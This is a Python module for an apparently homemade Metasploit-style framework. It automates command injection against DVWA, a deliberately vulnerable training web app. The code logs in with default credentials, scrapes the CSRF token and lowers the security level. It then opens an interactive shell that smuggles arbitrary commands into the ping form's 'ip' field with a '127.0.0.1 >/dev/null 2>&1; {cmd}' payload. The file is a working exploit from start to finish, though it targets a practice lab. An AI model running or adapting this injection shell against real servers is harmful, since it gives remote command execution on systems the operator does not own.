import requests
from datetime import datetime
import os
#################

class Module:
    def __init__(self):
        self.name = "cmd_injection"
        self.description = "DVWA Command Injection Interactive Shell (Low security)"
        self.target = "http://192.168.107.129"
        self.user = "admin"
        self.password = "password"
        self.log_file = "dvwa_session.log"
        self.session = None
        self.vuln_url = None

    def show_options(self):
        print("\nCurrent Module Options (cmd_injection):")
        print(f"  target     → {self.target}   (DVWA base URL, required)")
        print(f"  user       → {self.user}     (DVWA username)")
        print(f"  password   → {self.password} (DVWA password)")
        print(f"  log_file   → {self.log_file}  (session log path)\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip().lower()

        if cmd == "show options":
            self.show_options()
            return

        if cmd.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1]
            value = parts[2]
            if option == "target":
                self.target = value.rstrip("/")
                print(f"[+] target → {self.target}")
            elif option == "user":
                self.user = value
                print(f"[+] user → {self.user}")
            elif option == "password":
                self.password = value
                print(f"[+] password → {self.password}")
            elif option == "log_file":
                self.log_file = value
                print(f"[+] log_file → {self.log_file}")
            else:
                print(f"[-] Unknown option: {option}")
            return

        if cmd in ["run", "exploit"]:
            self.run()
            return

        print("Unknown command in cmd_injection module.")
        print("Available: show options, set <option> <value>, run / exploit")

    def log_cmd(self, cmd, output):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{ts}] CMD: {cmd}\n")
            f.write(f"OUTPUT:\n{output}\n")
            f.write("-" * 80 + "\n")

    def run(self):
        print(f"[*] Starting DVWA Command Injection on {self.target}")
        self.session = requests.Session()

        # Connectivity check
        try:
            r = self.session.get(self.target, timeout=6)
            print(f"[+] Target reachable (HTTP {r.status_code})")
        except Exception as e:
            print(f"[-] Cannot reach target: {e}")
            return

        # Login with CSRF token
        login_url = f"{self.target}/login.php"
        print("[*] Fetching login page for token...")
        try:
            r_get = self.session.get(login_url, timeout=6)
        except Exception as e:
            print(f"[-] Login page fetch failed: {e}")
            return

        token_marker = "name='user_token' value='"
        token_pos = r_get.text.find(token_marker)
        user_token = ""
        if token_pos != -1:
            start = token_pos + len(token_marker)
            end = r_get.text.find("'", start)
            user_token = r_get.text[start:end]
            print(f"[+] CSRF token: {user_token}")

        print("[*] Logging in...")
        login_data = {
            "username": self.user,
            "password": self.password,
            "user_token": user_token,
            "Login": "Login"
        }
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text or "Welcome" in r_login.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed")
            print("Response snippet:")
            print(r_login.text[:400])
            return

        # Set security level low
        print("[*] Setting security level to Low...")
        sec_url = f"{self.target}/security.php"
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})
        self.session.get(f"{sec_url}?security=low")

        self.vuln_url = f"{self.target}/vulnerabilities/exec/"
        print(f"[*] Using injection endpoint: {self.vuln_url}")
        print("[+] Interactive shell ready. Type commands below.\n")
        print("  (ping output is suppressed via >/dev/null 2>&1)\n")

        while True:
            try:
                cmd = input("\033[92mdvwa-shell>\033[0m ").strip()
                if cmd.lower() in ["exit", "quit", "back"]:
                    print("[*] Exiting module...")
                    break
                if cmd.lower() == "help":
                    print("  help          - this help")
                    print("  exit / quit / back - return to framework")
                    print("  clear         - clear screen")
                    print("  Any other     - command to execute")
                    continue
                if cmd.lower() == "clear":
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue
                if not cmd:
                    continue

                # Clean payload – suppress ping output
                payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
                data = {"ip": payload, "Submit": "Submit"}

                r = self.session.post(self.vuln_url, data=data)

                # Extract from <pre> tag
                if "<pre>" in r.text and "</pre>" in r.text:
                    output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
                else:
                    output = r.text.strip()

                print(output if output else "[no output]")
                self.log_cmd(cmd, output)
                print("-" * 70)

            except KeyboardInterrupt:
                print("\n[*] Interrupted – type exit to leave module")
            except Exception as e:
                print(f"[-] Error during execution: {e}")